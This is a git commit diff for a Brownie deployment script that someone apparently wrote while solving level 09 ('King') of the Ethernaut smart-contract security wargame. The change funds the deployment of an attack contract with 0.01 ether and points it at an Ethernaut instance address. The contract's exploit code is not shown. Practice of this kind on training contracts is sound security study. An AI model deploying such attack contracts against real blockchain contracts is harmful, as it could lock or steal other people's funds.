10b0445f7252bd2e34a6e6a893cf2cd325aaac45
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-14 14:36:23 +0100

    level 09-King completed, updated files, see README.md

--- scripts/09-deploy_attack.py
+++ scripts/09-deploy_attack.py
@@ -2,13 +2,16 @@ from scripts.helpful_scripts import get_account
 from brownie import web3, Attack09, convert
 
 ETHERNAUT_INSTANCE = "0x36A486BAe1988F4aCB1F9ab5e0606A7A9f635C4f"
-PRIZE = 30000000
+PRIZE = web3.toWei(0.01, "ether")
 
 
 def main():
 
     player = get_account()
 
-    attack_contract = Attack09.deploy(ETHERNAUT_INSTANCE, {"from": player})
+    # call prize - read the value - set PRIZE = prize
 
-    print(f"attack contract deployed at: {attack_contract}")
+    attack_contract = Attack09.deploy(
+        ETHERNAUT_INSTANCE, {"from": player, "value": PRIZE}
+    )
+    print(f"attack contract deployed at: {attack_contract}\n")
